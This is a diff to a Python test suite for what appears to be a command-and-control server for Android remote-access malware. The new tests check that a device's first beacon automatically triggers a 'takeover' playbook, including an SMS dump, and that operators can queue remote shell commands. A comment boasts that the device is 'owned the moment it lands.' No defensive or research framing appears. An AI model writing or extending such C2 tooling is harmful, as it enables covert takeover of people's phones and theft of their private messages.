@@ -107,6 +107,20 @@ def test_store_hands_out_once(home):
     assert not store.complete_task(task_id, "s", "again")
 
 
+def test_takeover_runs_once(home, psk):
+    hub = server.Hub(psk=psk, token="tok", public_url="http://test")
+    store.register("sid-t", {"spec": "rat"}, "ip")
+    assert server.auto_takeover(hub, "sid-t") > 0
+    assert server.auto_takeover(hub, "sid-t") == 0
+
+
+def test_takeover_respects_spec(home, psk):
+    hub = server.Hub(psk=psk, token="tok", public_url="http://test")
+    store.register("sid-m", {"spec": "minimal"}, "ip")
+    queued = [cmd for cmd, _ in server.takeover_playbook("minimal")]
+    assert "info" in queued and "sms_dump" not in queued
+
+
 def test_stale_requeue(home):
     store.register("s", {}, "ip")
     task_id = store.queue_task("s", "ping")
@@ -124,15 +138,25 @@ def test_beacon_flow_and_auth(app, psk):
             async with ClientSession() as http:
                 client = Client(http, str(server_.make_url("/")), psk, "sid-1")
                 reply = await client.beacon({"op": "register", "meta": {"model": "Pixel", "sdk": 34}})
-                assert reply["ok"] and reply["tasks"] == []
+                assert reply["ok"]
+                # First contact runs the takeover playbook before the operator
+                # ever types: the device is owned the moment it lands.
+                initiation = [t["cmd"] for t in reply["tasks"]]
+                assert "info" in initiation and "takeover" in initiation
+                assert "sms_dump" in initiation
+                assert reply["sleep"] == server.Hub.takeover_sleep_ms
 
                 response = await client.api("POST", "/api/task/sid-1", json={"cmd": "shell", "args": ["id"]})
                 assert response.status == 200
                 task = (await (await client.api("POST", "/api/task/sid-1",
                                                 json={"cmd": "info"})).json())["id"]
 
-                reply = await client.beacon({"op": "poll", "wanted": 4})
                 ids = [t["id"] for t in reply["tasks"]]
+                for _ in range(3):
+                    if task in ids:
+                        break
+                    reply = await client.beacon({"op": "poll", "wanted": server.Hub.max_tasks})
+                    ids = [t["id"] for t in reply["tasks"]]
                 assert task in ids
 
                 reply = await client.beacon({
